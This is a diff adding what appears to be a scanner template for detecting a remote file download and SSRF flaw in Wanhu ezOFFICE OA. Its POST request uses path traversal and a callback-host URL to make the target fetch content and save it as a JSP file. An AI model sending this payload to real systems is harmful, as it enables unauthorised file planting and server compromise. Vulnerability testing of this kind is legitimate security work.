@@ -1,0 +1,30 @@
+id: wanhu-ezoffice-file2html-controller-anyfile-download
+info:
+  name: Wanhu OA file2Html.controller Remote File Download
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: dnslog, ssrf, highrisk
+
+dns:
+  - name: "{{randstr}}.{{interactsh-url}}"
+    type: A
+
+http:
+  - method: POST
+    path:
+      - "/defaultroot/yzConvertFile/file2Html.controller"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "fileName=qwe.jsp&path=../platform/portal/&url=http://{{interactsh-url}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: word
+        part: body
+        words:
+          - "qwe.jsp"
